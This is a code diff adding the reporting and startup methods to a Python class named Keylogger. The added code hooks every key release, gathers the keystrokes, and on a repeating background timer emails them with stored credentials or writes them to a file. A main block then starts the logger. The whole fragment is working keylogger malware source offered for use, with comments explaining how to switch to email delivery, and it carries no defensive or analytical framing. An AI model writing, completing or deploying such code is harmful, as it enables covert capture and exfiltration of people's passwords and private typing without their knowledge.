@@ -98,5 +98,46 @@ class Keylogger:
         if verbose:
             print(f"{datetime.now()} - Sent an email to {email} containing:  {message}")
 
+    """
+        This function gets called every `self.interval`
+        It basically sends keylogs and resets `self.log` variable
+        """
+    def report(self):
+        if self.log:
+            # if there is something in log, report it
+            self.end_dt = datetime.now()
+            # update `self.filename`
+            self.update_filename()
+            if self.report_method == "email":
+                self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
+            elif self.report_method == "file":
+                self.report_to_file()
+            # if you don't want to print in the console, comment below line
+            print(f"[{self.filename}] - {self.log}")
+            self.start_dt = datetime.now()
+        self.log = ""
+        timer = Timer(interval=self.interval, function=self.report)
+        # set the thread as daemon (dies when main thread die)
+        timer.daemon = True
+        # start the timer
+        timer.start()
 
-    
+    def start(self):
+        # record the start datetime
+        self.start_dt = datetime.now()
+        # start the keylogger
+        keyboard.on_release(callback=self.callback)
+        # start reporting the keylogs
+        self.report()
+        # make a simple message
+        print(f"{datetime.now()} - Started keylogger")
+        # block the current thread, wait until CTRL+C is pressed
+        keyboard.wait()
+
+if __name__ == "__main__":
+    # if you want a keylogger to send to your email
+    # keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
+    # if you want a keylogger to record keylogs to a local file 
+    # (and then send it using your favorite method)
+    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
+    keylogger.start()
